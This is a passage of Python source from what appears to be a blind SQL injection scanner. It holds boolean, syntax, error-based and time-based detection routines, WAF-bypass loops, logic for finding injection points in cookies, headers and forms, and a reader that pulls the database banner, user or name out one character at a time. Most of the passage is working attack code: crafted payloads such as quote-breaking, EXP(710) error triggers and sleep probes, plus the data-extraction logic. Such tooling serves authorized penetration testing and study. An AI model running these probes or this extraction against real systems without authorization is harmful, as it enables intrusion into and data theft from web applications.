        # through needs an alternative space AND an operator without '=' AND a
        # context that ends without a comment. Trying each axis alone found
        # nothing in 235 requests; crossing them finds it.
        #
        # The context list stays short for the same budget reason as ever, but
        # it includes a comment-free shape, because a filter on '--' otherwise
        # takes every other context down with it.
        self.con.debug("    plain pass empty — trying WAF bypasses")
        for ctx in WAF_CONTEXTS:
            for op in LOGIC_OPS:
                for pairs in (BOOL_PAIRS_NOEQ, BOOL_PAIRS):
                    for name, _fn in TAMPERS:
                        if pairs is BOOL_PAIRS and name == "plain":
                            continue        # that is the pass that just failed
                        conf = self._bool_try(pt, base_norm, ctx, op,
                                              pairs, name)
                        if conf:
                            return conf
        return None

    # -- syntax

    def syntax(self, pt: Point, baseline: Response) -> Confirmation | None:
        """
        Break the string literal, then repair it, then comment it out.

        Every other family here needs the QUERY'S RESULT to reach the page:
        boolean reads a row that appears or does not, error reads a branch that
        raises or does not, time reads a wait. An application that runs a query
        on a tracking cookie and throws the result away offers none of that --
        measured on such a target, all twenty context/polarity combinations
        scored 1.000 against 1.000, because every response really was the same
        page. What still moves is whether the query PARSES.

        Four requests per quote character:

            value'        breaks the literal              -> A
            value''       the quote is now data again     -> B
            value'-- -    the rest of the query is gone   -> C
            value"        a character with no meaning
                          inside a single-quoted literal  -> D

        A must differ from B and from C; C must render like the baseline,
        because commenting the tail out restores the original lookup; and D
        must render like B, which is what rules out "this target reacts to any
        odd character" -- a filter, not a parser. Then the same thing again
        with three and four quotes, so a one-off response cannot carry it.

        Nothing here reads an error message. The signal is which responses are
        alike, exactly as in the other families; the page may say Internal
        Server Error and nothing else and this still works.
        """
        hi = self.args.true_threshold
        base_norm = self.cmp_body(baseline, pt)

        seen = {base_norm: baseline.status}

        def send(suffix: str) -> str | None:
            r = self._inject(pt, suffix)
            if not r.ok:
                return None
            n = self.cmp_body(r, pt, pt.current() + suffix)
            seen[n] = r.status
            return n

        def same(a: str, b: str) -> bool:
            return similarity(a, b) >= hi

        def sig(x: str) -> str:
            """Short fingerprint, so the debug line says what was compared."""
            return f"{seen.get(x, '?')}/{len(x)}b"

        for label, q, other in (("string-single", "'", '"'),
                                ("string-double", '"', "'")):
            a = send(q)
            b = send(q * 2)
            if a is None or b is None:
                self.con.debug(f"    [{label}/syntax] no usable response")
                continue
            # Reported whatever happens. A probe that gives up in silence is a
            # probe nobody can tell apart from one that never ran.
            self.con.debug(
                f"    [{label}/syntax] {q}={sig(a)} {q * 2}={sig(b)} "
                f"base={sig(base_norm)} sim(broken,repaired)="
                f"{similarity(a, b):.3f}")
            if same(a, b):
                self.con.debug(f"    [{label}/syntax] breaking the literal "
                               f"changed nothing a second quote puts back — "
                               f"not this context")
                continue
            c = send(q + "-- -")
            d = send(other)
            if c is None or d is None:
                continue
            checks = {
                "broken != commented": not same(a, c),
                "commented ~ baseline": same(c, base_norm),
                "inert char ~ repaired": same(d, b),
            }
            self.con.debug(
                f"    [{label}/syntax] {q}-- -={sig(c)} {other}={sig(d)} | " +
                ", ".join(f"{k}={v}" for k, v in checks.items()))
            if not all(checks.values()):
                continue

            # again with one more quote on each side: three is unterminated
            # like one, four is balanced like two
            a2, b2 = send(q * 3), send(q * 4)
            if a2 is None or b2 is None:
                continue
            # What has to repeat is the BREAK and the REPAIR, not the exact
            # error page: a verbose message can quote the failing query, so two
            # broken responses may legitimately differ in length while both
            # being broken. Requiring a2 to resemble a would decline that.
            repeat = {"3q != 4q": not same(a2, b2), "4q ~ 2q": same(b2, b)}
            self.con.debug(f"    [{label}/syntax] {q * 3}={sig(a2)} "
                           f"{q * 4}={sig(b2)} | " +
                           ", ".join(f"{k}={v}" for k, v in repeat.items()))
            if not all(repeat.values()):
                self.con.debug(f"    [{label}/syntax] the three/four-quote "
                               f"pair did not repeat it — not a hit")
                continue

            ctx = next((x for x in CONTEXTS if x.label == label), CONTEXTS[1])
            self.con.debug(f"    [{label}/syntax] confirmed")
            return Confirmation(
                # suffixes only: test_point prepends the point's own value
                "syntax", None, ctx, q + "-- -", q,
                f"the value sits inside a {q}-quoted literal: appending {q} "
                f"changes the response, appending {q * 2} puts it back, and "
                f"{q}-- - restores the original result by commenting the rest "
                f"of the statement out; {other}, which has no meaning inside "
                f"that literal, changes nothing, so the reaction is the parser "
                f"and not an input filter; repeated with three and four quotes",
                op="AND", true_resembles_base=True,
                ref_true=base_norm, ref_false=a)
        return None

    # -- transport

    def transport(self, pt: Point, baseline: Response, q: str = "'") -> str:
        """
        Which spelling of a SPACE this injection point actually carries.

        A cookie value is not allowed to contain a space (RFC 6265), and a fair
        number of stacks simply stop reading the value there. Every payload
        this tool builds is full of spaces, so on such a point the server sees
        `value'` and nothing else: the statement is unterminated whatever the
        payload said, so the raising probe and its non-raising control come
        back as the SAME error page and the oracle declares itself useless.
        Measured on a replica that truncates at the first space: 76 error
        probes "changed nothing" and 39 sleep payloads produced no delay, on a
        target where the injection is real and reachable.

        The probe is a payload that must render like the baseline: `' AND
        '1'='1` keeps the original row and closes the literal by hand. If the
        plain form does not, the same thing is tried with each substitute for
        the space. One request when nothing is wrong, which is the usual case.
        """
        base_norm = self.cmp_body(baseline, pt)
        probe = f"{q} AND {q}1{q}={q}1"
        for name, fn in TAMPERS[:6]:        # plain, then the space substitutes
            pl = fn(probe)
            r = self._inject(pt, pl)
            if not r.ok:
                continue
            n = self.cmp_body(r, pt, pt.current() + pl)
            sim = similarity(n, base_norm)
            self.con.debug(f"    [transport/{name}] sim={sim:.3f} "
                           f"status {r.status}")
            if sim >= self.args.true_threshold:
                return name
        return ""

    # -- error
    #
    # Third family, for the case both others miss: the difference between TRUE
    # and FALSE exists but is too small to see, and the engine offers no delay.

    def error_based(self, pt: Point, baseline: Response,
                    only_ctx: Ctx = None,
                    tamper: str = "plain") -> Confirmation | None:
        """
        Make the FALSE branch raise a database error.

        When the only thing separating TRUE from FALSE is one sentence inside a
        large constant page, the similarity oracle cannot see it: measured on
        bWAPP's own "Blind - Boolean-Based" page, the best signal was a delta of
        0.004 against a 0.05 threshold. An error changes the whole response —
        the page is cut short where the query failed — so the same invisible
        branch becomes unmistakable.

        The comparison is between two payloads that carry the SAME condition
        and differ only in whether the branch they reach can raise:

          bad      CASE WHEN (false) THEN 1 ELSE EXP(710) END=1   raises
          control  CASE WHEN (false) THEN 1 ELSE 00000000 END=1   cannot

        Both are false, both are the same length, so neither the value of the
        condition nor the length of the payload can account for a difference —
        only the error can. Length matters more than it looks: a login form
        that echoes the submitted value back makes the response grow with the
        payload, and an eight-character difference between the two branches was
        enough to make this oracle decline a page it should have flagged.

        Determinism is proved rather than assumed: the same control is sent
        with a second, equally long false condition and has to come back
        byte-identical. A page that is not stable disqualifies itself here
        instead of being guessed at.
        """
        # 1/0 covers PostgreSQL, MSSQL and Oracle, so three probes cover five
        # engines. The error family is a fallback, not a coverage sweep, so it
        # stays on the classic contexts whatever --level says.
        by_expr = {}
        for d in DBMS_LIST:
            by_expr.setdefault(d.error_expr, d)
        engines = list(by_expr.values())

        def case(cond: str, alt: str) -> str:
            return f"CASE WHEN ({cond}) THEN 1 ELSE {alt} END=1"

        def engines_for(ctx: Ctx) -> list:
            if not ctx.label.startswith("concat"):
                return engines
            # || is concatenation on Oracle, PostgreSQL and SQLite and OR on
            # MySQL; + is concatenation on MSSQL only. Sending the wrong one is
            # two requests that can only mislead.
            want = ("concat-plus" if ctx.label == "concat-plus"
                    else "concat-pipe")
            ok = {"concat-pipe": ("PostgreSQL", "Oracle", "SQLite"),
                  "concat-plus": ("Microsoft SQL Server",)}[want]
            return [d for d in DBMS_LIST if d.name in ok and d.error_str]

        def shapes_for(ctx: Ctx, dbms: Dbms) -> list:
            """Ways to write "raise when the condition is false", in order."""
            if ctx.label.startswith("concat"):
                # the expression lands where a STRING is expected, so the
                # branches have to be strings and the whole thing a subquery
                return [lambda c, a: f"SELECT CASE WHEN ({c}) THEN '' "
                                     f"ELSE {a} END{dbms.dual}"]
            return [
                case,
                # A scalar subquery is evaluated once, whatever the planner
                # decides to do with the row: the same reason the time family
                # already wraps its delay this way.
                lambda c, a: f"(SELECT CASE WHEN ({c}) THEN 1 ELSE {a} "
                             f"END{dbms.dual})=1",
            ]

        # When the syntax probe has proved which quote closes the literal, the
        # sweep is every context built on THAT quote rather than one shape --
        # the concatenation forms included, which is where the reference
        # payload for a conditional error lives and which a single-context
        # sweep would never reach.
        if only_ctx is not None:
            q = only_ctx.stack[:1]
            sweep = [c for c in CONTEXTS if c.stack[:1] == q] or [only_ctx]
        else:
            sweep = CONTEXTS_BY_LEVEL[1]

        for ctx in sweep:
            concat = ctx.label.startswith("concat")
            for op in (LOGIC_OPS if ctx.uses_op else ["AND"]):
                for dbms in engines_for(ctx):
                    if concat:
                        err, safe = dbms.error_str, dbms.error_str_safe
                    else:
                        err = dbms.error_expr
                        safe = dbms.error_safe or "0" * len(err)
                    if not (err and safe):
                        continue
                    for shape in shapes_for(ctx, dbms):
                        mk = lambda c, a, _s=shape: build_condition(
                            ctx, _s(c, a), dbms, op=op, tamper=tamper)

                        p_ctl1, p_bad1 = mk(ERROR_PAIRS[0][1], safe), mk(ERROR_PAIRS[0][1], err)
                        ctl1 = self._inject(pt, p_ctl1)
                        bad1 = self._inject(pt, p_bad1)
                        if not (ctl1.ok and bad1.ok):
                            continue
                        n_ctl1 = self.cmp_body(ctl1, pt, pt.current() + p_ctl1)
                        n_bad1 = self.cmp_body(bad1, pt, pt.current() + p_bad1)
                        moved = (n_bad1 != n_ctl1 or bad1.status != ctl1.status)
                        self.con.debug(
                            f"    [{ctx.label}/{op}/{dbms.name}] error probe "
                            f"moved={moved} status {ctl1.status}/{bad1.status} "
                            f"len {len(n_ctl1)}/{len(n_bad1)}")
                        if not moved:
                            self.note("the raising expression changed nothing "
                                      "(it did not raise, or the page hides it)")
                            continue          # two requests spent

                        # reproduce with a second, equally long false condition
                        p_ctl2, p_bad2 = mk(ERROR_PAIRS[1][1], safe), mk(ERROR_PAIRS[1][1], err)
                        ctl2 = self._inject(pt, p_ctl2)
                        bad2 = self._inject(pt, p_bad2)
                        if not (ctl2.ok and bad2.ok):
                            continue
                        n_ctl2 = self.cmp_body(ctl2, pt, pt.current() + p_ctl2)
                        n_bad2 = self.cmp_body(bad2, pt, pt.current() + p_bad2)
                        if n_ctl1 != n_ctl2 or ctl1.status != ctl2.status:
                            self.con.debug("    control not byte-stable — "
                                           "page is dynamic, not an error oracle")
                            self.note("the non-raising control was not stable "
                                      "between two false conditions")
                            continue
                        if n_bad2 == n_ctl2 and bad2.status == ctl2.status:
                            self.con.debug("    second pair did not raise — "
                                           "not a hit")
                            self.note("the second condition pair did not raise")
                            continue

                        # the TRUE reference the extraction oracle reads against
                        p_ok = mk(ERROR_PAIRS[0][0], err)
                        ok = self._inject(pt, p_ok)
                        if not ok.ok:
                            continue
                        n_ok = self.cmp_body(ok, pt, pt.current() + p_ok)
                        if n_ok == n_bad1 and ok.status == bad1.status:
                            self.con.debug("    TRUE branch raised too — the "
                                           "payload itself is broken, not a hit")
                            self.note("the TRUE branch raised as well, so the "
                                      "payload shape does not parse here")
                            continue

                        delta = abs(len(n_bad1) - len(n_ctl1))
                        return Confirmation(
                            "error", dbms, ctx, mk(ERROR_PAIRS[0][0], err),
                            mk(ERROR_PAIRS[0][1], err),
                            f"{dbms.name} error oracle in {op} polarity: two "
                            f"payloads carrying the same false condition and the "
                            f"same length differ only in reaching {err}, and the "
                            f"response moves by {delta} byte(s) "
                            f"(status {ctl1.status} -> {bad1.status}); the "
                            f"non-raising control comes back byte-identical under "
                            f"a second false condition, so the page is "
                            f"deterministic and the difference is the error",
                            op=op, ok_norm=n_ok, tamper=tamper)
        return None

    # -- time

    def _baseline_latency(self, pt: Point) -> float:
        samples = []
        for _ in range(3):
            r = self._inject(pt, "")
            if r.ok:
                samples.append(r.elapsed)
        return statistics.median(samples) if samples else 0.0

    def time_based(self, pt: Point,
                   tamper: str = "plain") -> Confirmation | None:
        base = self._baseline_latency(pt)
        d1 = self.args.sleep
        d2 = max(2, d1 * 2)
        self.con.debug(f"    baseline latency {base:.2f}s; "
                       f"probing {d1}s then {d2}s")
        if base > self.args.timeout / 2:
            self.con.debug("    baseline already near the timeout — skipping time tests")
            return None

        # Every probe that lands costs a real delay, so the default sweep stays
        # close to the original budget: the classic contexts, one delay shape
        # per engine. --waf opens it to every context and every shape.
        wide = getattr(self.args, "waf", False)
        for ctx in contexts_for(self.args, time_based=True):
            for dbms in DBMS_LIST:
                forms = dbms.time_forms if wide else dbms.time_forms[:1]
                for form in forms:
                    # a stacked statement carries no connector of its own
                    ops = ["AND"] if form.kind == "stack" else (
                        LOGIC_OPS if ctx.uses_op else ["AND"])
                    for op in ops:
                        conf = self._time_try(pt, ctx, op, dbms, form,
                                              base, d1, d2, tamper)
                        if conf:
                            return conf
        return None

    def _time_try(self, pt, ctx, op, dbms, form, base, d1, d2,
                  tamper="plain"):
        pl1 = build_time(ctx, dbms, d1, op=op, form=form, tamper=tamper)
        if not pl1:
            return None
        r1 = self._inject(pt, pl1)
        if not r1.ok or r1.elapsed < base + d1 * 0.6:
            self.note("no delay came back from any sleep payload")
            return None
        tag = f"{ctx.label}/{op}/{dbms.name}" + (f"/{form.note}" if form.note else "")
        self.con.debug(f"    [{tag}] {d1}s probe took {r1.elapsed:.2f}s "
                       f"(baseline {base:.2f}s)")

        # control: same shape, no delay. Must come back fast.
        pl0 = build_time(ctx, dbms, 0, op=op, form=form, tamper=tamper)
        r0 = self._inject(pt, pl0) if pl0 else None
        if r0 is not None and r0.ok and r0.elapsed > base + d1 * 0.6:
            self.con.debug("    zero-delay control was also slow — "
                           "page is just slow, not injectable")
            self.note("the zero-delay control was slow too")
            return None

        # scale: a longer sleep must take proportionally longer
        pl2 = build_time(ctx, dbms, d2, op=op, form=form, tamper=tamper)
        r2 = self._inject(pt, pl2)
        if not r2.ok or r2.elapsed < base + d2 * 0.6:
            self.con.debug("    delay did not scale with duration — "
                           "not treating as a hit")
            self.note("the delay did not scale with the requested duration")
            return None

        return Confirmation(
            "time", dbms, ctx, pl1, pl0 or "",
            (f"baseline {base:.2f}s; {d1}s probe -> {r1.elapsed:.2f}s; "
             f"{d2}s probe -> {r2.elapsed:.2f}s; zero-delay control -> "
             f"{r0.elapsed:.2f}s" if r0 is not None else
             f"baseline {base:.2f}s; {d1}s -> {r1.elapsed:.2f}s; "
             f"{d2}s -> {r2.elapsed:.2f}s")
            + (f" [{form.note}]" if form.note else ""),
            op=op, form=form, tamper=tamper)


# ----------------------------------------------------------------------------
# proof-of-concept extraction — the only data this tool reads
# ----------------------------------------------------------------------------

class OracleLost(Exception):
    """The oracle stopped answering in either of the two shapes it knows."""


class PocReader:
    """
    Reads one short value out of the database, character by character, by
    binary search over the code point.

    This is the entire extraction capability. --poc chooses between three
    expressions fixed per engine (see Dbms.poc_expr): the version banner, the
    current account, or the current database. Table and column access is not
    implemented and there is no flag that would enable it. Any of the three
    proves the injection reaches the query engine; which one a report needs
    depends on what the client has to be convinced of.
    """

    PRINTABLE_LO, PRINTABLE_HI = 32, 126

    def __init__(self, tester: BlindTester, con: Console, args):
        self.t = tester
        self.con = con
        self.args = args

    # -- oracles

    def _bool_oracle(self, pt: Point, conf: Confirmation, base_norm: str):
        """
        Classify an answer against the TWO shapes the confirmation observed,
        not against the baseline.

        Reading "how far is this from the baseline" is enough to DETECT a
        differential and not enough to READ one. In OR polarity a TRUE
        condition renders unlike the baseline -- and so does a 500. Asking
        PostgreSQL a MySQL tautology raises, the raise scores 0.000, 0.000 is
        "unlike the baseline", so the engine was identified as MySQL and the
        banner came back as a row of '~': every bit of the binary search had
        answered yes. Comparing to both references instead makes an answer that
        looks like neither what it is -- unusable -- rather than a silent TRUE.
        """
        hi = self.args.true_threshold
        delta = self.args.min_delta
        ref_t = conf.ref_true or (base_norm if conf.true_resembles_base else "")
        ref_f = conf.ref_false or (base_norm if not conf.true_resembles_base else "")

        def ask(cond: str):
            # same connector AND same filter bypass that exposed the injection:
            # a payload that only gets through tampered has to stay tampered
            pl = build_condition(conf.context, cond, DBMS_LIST[0], op=conf.op,
                                 tamper=conf.tamper)
            r = self.t._inject(pt, pl)
            if not r.ok:
                return None
            n = self.t.cmp_body(r, pt, pt.current() + pl)
            s_t = similarity(n, ref_t) if ref_t else 0.0
            s_f = similarity(n, ref_f) if ref_f else 0.0

            if conf.by_marker:
                # The two shapes are nearly identical by construction here, so
                # the distance says nothing; what it still rules out is a THIRD
                # page -- an error, a block -- which resembles neither.
                if max(s_t, s_f) < hi:
                    return None
                sh = shingles(n)
                has_t = (conf.mark_true <= sh) if conf.mark_true else None
                has_f = (conf.mark_false <= sh) if conf.mark_false else None
                if has_t is not None and has_f is not None:
                    return None if has_t == has_f else has_t
                return has_t if has_t is not None else (not has_f)

            if max(s_t, s_f) < hi or abs(s_t - s_f) < delta:
                return None             # neither shape, or too close to call
            return s_t > s_f
        return ask

    def _error_oracle(self, pt: Point, conf: Confirmation):
        """
        TRUE renders, FALSE reaches the raising expression and does not.

        Exact, like the detection that established it: the confirmation already
        proved this response is byte-stable, so anything other than the exact
        non-erroring body means the branch raised.
        """
        err = conf.dbms.error_expr

        def ask(cond: str):
            pl = build_condition(
                conf.context, f"CASE WHEN ({cond}) THEN 1 ELSE {err} END=1",
                conf.dbms, op=conf.op, tamper=conf.tamper)
            r = self.t._inject(pt, pl)
            if not r.ok:
                return None
            return self.t.cmp_body(r, pt, pt.current() + pl) == conf.ok_norm
        return ask

    def _time_oracle(self, pt: Point, conf: Confirmation, base_lat: float):
        d = max(1, self.args.extract_sleep)

        def ask(cond: str):
            # reuse the delay shape that worked, not whichever comes first
            pl = build_time(conf.context, conf.dbms, d, cond=cond, op=conf.op,
                            form=conf.form, tamper=conf.tamper)
            if not pl:
                return None
            r = self.t._inject(pt, pl)
            if not r.ok:
                return None
            return r.elapsed >= base_lat + d * 0.6
        return ask

    # -- search

    def _identify(self, ask, dbms_candidates) -> Dbms | None:
        """
        Ask which engine we are talking to.

        Tautologies first: each one parses on a single engine and is true
        wherever it parses, so it needs no table, no banner and no privilege.
        The banner-length probe stays as a fallback, but it cannot be the first
        move — it asks for @@version, which is exactly what a filter blocks,
        and a failure there would be read as "wrong engine" instead of
        "expression refused".
        """
        # `is True` on purpose: an oracle answers True, False, or None when the
        # response looked like neither branch. A tautology the engine cannot
        # parse raises, and a raise is None, not a yes.
        for d in dbms_candidates:
            if ask(d.tautology) is True:
                self.con.debug(f"    engine answers the {d.name} tautology "
                               f"({d.tautology})")
                return d
        for d in dbms_candidates:
            # The banner, not the selected PoC: this probe is about which
            # engine is answering, and the version function is the expression
            # most likely to exist and be permitted everywhere.
            probe = f"{d.length.format(e=d.banner)}>0"
            if ask(probe) is True:
                self.con.debug(f"    engine responds to {d.name} syntax")
                return d
        return None

    def _char_at(self, ask, dbms: Dbms, pos: int, target: str) -> str | None:
        """
        Binary search one character; ~7 requests.

        An unusable answer aborts the read instead of being folded into the
        search: half a bit of noise in the middle of a binary search does not
        produce a slightly wrong character, it produces a confidently wrong
        one, and the report would carry it as fact.
        """
        lo, hi = self.PRINTABLE_LO, self.PRINTABLE_HI
        expr = dbms.ordinal.format(e=dbms.substr.format(e=target, p=pos))
        first = ask(f"{expr}>{lo - 1}")
        if first is None:
            raise OracleLost(f"position {pos}: the response matched neither "
                             f"the TRUE nor the FALSE page")
        if not first:
            return None                     # no such position / non-printable
        while lo < hi:
            mid = (lo + hi) // 2
            a = ask(f"{expr}>{mid}")
            if a is None:
                raise OracleLost(f"position {pos}, bit at {mid}: the response "
                                 f"matched neither the TRUE nor the FALSE page")
            if a:
                lo = mid + 1
            else:
                hi = mid
        return chr(lo)

    LABEL = {"banner": "banner", "user": "current user", "db": "current database"}

    def read(self, pt: Point, conf: Confirmation, baseline: Response) -> tuple:
        """Return (dbms_name, value, kind). Any of them may be empty."""
        want = getattr(self.args, "poc", "banner")
        if conf.kind == "syntax":
            # Confirmed by how the statement parses, which proves the
            # injection and offers no way to ask the database a question.
            self.con.info("  confirmed by syntax alone — no oracle to read a "
                          "value through; nothing extracted")
            return "", "", ""
        if conf.kind == "boolean":
            ask = self._bool_oracle(pt, conf, self.t.cmp_body(baseline, pt))
            candidates = DBMS_LIST
            cap = self.args.poc_chars
        elif conf.kind == "error":
            # the engine is already known: only its own raising expression
            # produced the differential
            ask = self._error_oracle(pt, conf)
            candidates = [conf.dbms] if conf.dbms else DBMS_LIST
            cap = self.args.poc_chars
        else:
            ask = self._time_oracle(pt, conf, self.t._baseline_latency(pt))
            candidates = [conf.dbms] if conf.dbms else DBMS_LIST
            # every probe costs a sleep, so keep time-based reads short
            cap = min(self.args.poc_chars, self.args.time_poc_chars)
            self.con.info(f"  time-based extraction is slow "
                          f"(~{self.args.extract_sleep}s per probe); "
                          f"reading at most {cap} characters")

        dbms = self._identify(ask, candidates)
        if not dbms and candidates is not DBMS_LIST:
            # The narrowed list came from whichever error_expr fired, and those
            # are NOT engine-specific: EXP(710) raises on PostgreSQL as well as
            # MySQL, 1/0 on several engines. So a wrong guess there would leave
            # the PoC unreadable and the DBMS line wrong. The tautologies do
            # discriminate, so widen and ask them all.
            self.con.debug("    narrowed engine guess did not answer; "
                           "retrying against every engine")
            dbms = self._identify(ask, DBMS_LIST)
        if not dbms:
            self.con.debug("    could not identify the engine — nothing read")
            return "", "", ""

        # Not every engine has every notion: SQLite has no account and no
        # meaningful current database. Say so and read the banner instead of
        # returning nothing, because the report still needs a proof.
        kind = want
        target = dbms.poc_expr(kind)
        if not target:
            self.con.info(f"  {dbms.name} has no {self.LABEL.get(want, want)}; "
                          f"reading the banner instead")
            kind = "banner"
            target = dbms.banner

        label = self.LABEL.get(kind, kind)
        out = []
        try:
            for pos in range(1, cap + 1):
                ch = self._char_at(ask, dbms, pos, target)
                if ch is None:
                    break
                out.append(ch)
                if self.con.level >= 1 and len(out) % 8 == 0:
                    self.con.info(f"  {label} so far: {''.join(out)}")
        except OracleLost as e:
            self.con.warn(f"  {label} read stopped after {len(out)} "
                          f"character(s): {e}")
        value = "".join(out).strip()
        if value and len(value) >= cap:
            value += "…"        # truncated by the cap, not the end of the string
        if not value:
            self.con.debug(f"    {label} came back empty "
                           f"({target} may be NULL or filtered)")
        return dbms.name, value, (kind if value else "")


# ----------------------------------------------------------------------------
# scanner
# ----------------------------------------------------------------------------

class Scanner:
    def __init__(self, http: Http, con: Console, args, status: Status = None):
        self.http = http
        self.con = con
        self.args = args
        self.status = status
        self.tester = BlindTester(http, con, args)
        self.reader = PocReader(self.tester, con, args)
        self.findings: list[Finding] = []
        self.skipped: list[dict] = []
        self.tested = 0
        self.req_cookie = ""       # cookie replayed in curl PoC (mode -r)
        self.jar: dict = {}        # cookies under test, one point each
        self._lk = threading.Lock()

    def add(self, f: Finding):
        with self._lk:
            self.findings.append(f)
        if self.status:
            self.status.record(f.sev)
        self.con.finding(f)

    def bump(self, n=1):
        with self._lk:
            self.tested += n

    # -- discovery

    def preflight(self, url: str, method: str = "GET",
                  data: dict | None = None) -> Response | None:
        last = ""
        for attempt in range(1, PREFLIGHT_TRIES + 1):
            r = self.http.send(url, method, data=data)
            if r.ok and r.status < 500 and not (300 <= r.status < 400):
                if attempt > 1:
                    self.con.info(f"{url}: answered on attempt {attempt}")
                return r
            last = r.error or f"HTTP {r.status}"
            self.con.warn(f"{url}: attempt {attempt}/{PREFLIGHT_TRIES} "
                          f"failed ({last})")
            if attempt < PREFLIGHT_TRIES:
                time.sleep(PREFLIGHT_BACKOFF * attempt)
        with self._lk:
            self.skipped.append({"url": url, "reason": last})
        self.con.skip(f"{url} — no usable response after {PREFLIGHT_TRIES} "
                      f"attempts ({last}); skipped")
        return None

    @staticmethod
    def _forms(body: str, page_url: str) -> list[Point]:
        """Minimal form discovery — enough to reach POST parameters."""
        points = []
        for fm in re.finditer(r"<form\b(.*?)</form>", body, re.S | re.I):
            attrs, inner = fm.group(1), fm.group(0)
            am = re.search(r'action\s*=\s*["\']([^"\']*)', attrs, re.I)
            mm = re.search(r'method\s*=\s*["\']?(\w+)', attrs, re.I)
            action = urljoin(page_url, am.group(1) if am else page_url)
            method = (mm.group(1).upper() if mm else "GET")
            method = method if method in ("GET", "POST") else "GET"
            fields, types = {}, {}
            for im in re.finditer(r"<(?:input|textarea|select)\b([^>]*)>", inner, re.I):
                a = im.group(1)
                nm = re.search(r'name\s*=\s*["\']([^"\']+)', a, re.I)
                if not nm:
                    continue
                tm = re.search(r'type\s*=\s*["\']?(\w+)', a, re.I)
                vm = re.search(r'value\s*=\s*["\']([^"\']*)', a, re.I)
                fields[nm.group(1)] = vm.group(1) if vm else "1"
                types[nm.group(1)] = (tm.group(1).lower() if tm else "text")
            for name, t in types.items():
                if t in INERT_INPUT_TYPES:
                    continue
                # form field's existing value is the real value to append to
                points.append(Point(action, name, method, dict(fields),
                                    base=fields.get(name) or ""))
        return points

    def wanted_params(self) -> list:
        """Specs given with -p. An empty list means 'test everything'."""
        return parse_param_specs(getattr(self.args, "param", None) or "")

    def _make_point(self, sp: ParamSpec, url: str, method: str,
                    data: dict | None) -> Point:
        """
        Build the point for a -p name the request does not already carry.

        Not an error and not an empty scan: an endpoint that accepts a
        parameter without advertising it is the normal case for an API, and a
        cookie or header worth testing is often one the capture happens not to
        include. The prefix says what to build; without one, a name in the
        header list or carrying a dash is a header -- no query parameter is
        called X-Forwarded-For -- and anything else is a query parameter.
        """
        known = {h.lower(): h for h in INJECTABLE_HEADERS}
        kind = sp.kind or ("header" if (sp.key in known or "-" in sp.key)
                           else "query")

        if kind == "header":
            h = known.get(sp.key, sp.name)
            base = self.http.header_for(url, h) or HEADER_BASE.get(h, "")
            self.con.info(f"-p: testing request header {h} "
                          f"(--headers not needed for a header named here)")
            return Point(url, h, method=method, data=data, header=h,
                         base=base, inject="header")

        if kind == "cookie":
            jar = dict(self.jar)
            jar.setdefault(sp.name, GUESSED_PARAM_BASE)
            self.con.info(f"-p: cookie '{sp.name}' is not in the request — "
                          f"sending it anyway")
            return Point(url, sp.name, method=method, data=data,
                         base=jar[sp.name], inject="cookie", cookies=jar)

        if kind == "body":
            body = dict(data or {})
            body.setdefault(sp.name, GUESSED_PARAM_BASE)
            self.con.info(f"-p: body parameter '{sp.name}' is not in the "
                          f"request — adding it")
            return Point(url, sp.name, method="POST", data=body,
                         base=body[sp.name], inject="body")

        self.con.info(f"-p: query parameter '{sp.name}' is not on the target "
                      f"— adding it to the query string")
        return Point(url, sp.name, method=method, data=data,
                     base=GUESSED_PARAM_BASE, inject="query")

    def _only_wanted(self, pts: list, url: str, specs: list,
                     method: str = "GET", data: dict | None = None) -> list:
        """Keep the points -p named, creating the ones that do not exist yet."""
        if not specs:
            return pts
        kept, taken = [], set()
        for sp in specs:
            found = [p for p in pts if sp.matches(p)]
            if not found:
                kept.append(self._make_point(sp, url, method, data))
                continue
            for p in found:
                if id(p) not in taken:
                    taken.add(id(p))
                    kept.append(p)
        dropped = len(pts) - len(taken)
        if dropped > 0:
            self.con.info(f"-p: {dropped} other injection point(s) skipped")
        return kept

    def cookie_points(self, url: str, method: str = "GET",
                      body: dict | None = None) -> list[Point]:
        """
        One point per cookie carried by -H or by the captured request.

        A cookie is a parameter like any other -- it reaches a WHERE clause as
        often as a query string does, and more often unescaped, because the
        code that reads it rarely looks like input handling. They are tested
        ONE AT A TIME, with the rest of the jar replayed untouched: a session
        cookie that is dropped or mangled costs the authentication the
        vulnerable query needs.

        Cookie IS a request header, so it follows the same rule as the others
        and waits for --headers. Naming one with -p cookie:NAME still tests it
        on its own, the way -p header:NAME does.
        """
        if getattr(self.args, "no_cookies", False) or not self.args.headers:
            return []
        # Nothing an auth file supplies is injected: the payload would replace
        # the credential and every later request would run unauthenticated,
        # which looks exactly like a target with no vulnerability. -p
        # overrides this, name by name.
        held = self.http.auth.cookies_for(url) if self.http.auth else set()
        jar = {k: v for k, v in self.jar.items() if k not in held}
        if held & set(self.jar):
            self.con.info(f"{len(held & set(self.jar))} cookie(s) held back — "
                          f"supplied by an auth file; name one with -p to test "
                          f"it anyway")
        if not jar:
            return []
        self.con.info(f"{len(jar)} cookie(s) to test one at a time: "
                      f"{', '.join(jar)}")
        return [Point(url, name, method=method, data=body, base=value,
                      inject="cookie", cookies=jar)
                for name, value in jar.items()]

    def learn_cookies(self, url: str, base: Response) -> bool:
        """
        Build the jar: what the request already carries, plus what the target
        handed back. True when the target added something.

        A tracking cookie is usually issued on the first visit, so a scan
        driven by -u alone would never see the one injection point the target
        offers. Values supplied with -H or captured with -r win over the
        server's, because those are the ones tied to the session under test.
        """
        given = parse_cookie_header(self.http.header_for(url, "Cookie"))
        jar = dict(base.cookies or {})
        jar.update(given)
        self.jar = jar
        fresh = [k for k in (base.cookies or {}) if k not in given]
        if not fresh:
            return False
        self.con.info(f"cookie(s) set by the target on the first request: "
                      f"{', '.join(fresh)}")
        # Carried on EVERY later request, baseline included. A page that looks
        # different once the tracking cookie is present would otherwise be
        # compared against a baseline taken without it, and the difference
        # would be read as the payload's doing.
        self.http.learned["Cookie"] = build_cookie_header(base.cookies or {})
        if not self.req_cookie:
            self.req_cookie = build_cookie_header(jar)
        return True

    def points_for(self, url: str, base: Response) -> list[Point]:
        wanted = self.wanted_params()
        # query parameters: base is whatever the URL already carries
        pts = [Point(url, k, base=v) for k, v in
               parse_qsl(urlsplit(url).query, keep_blank_values=True)]
        seen = {(p.url, p.param, p.method) for p in pts}

        if not self.args.no_forms:
            for p in self._forms(base.body, url):
                key = (p.url, p.param, p.method)
                if key not in seen:
                    seen.add(key)
                    pts.append(p)

        pts.extend(self.cookie_points(url, method="GET"))

        if wanted:
            # -p is an explicit instruction: no headers and no forms the user
            # did not ask for.
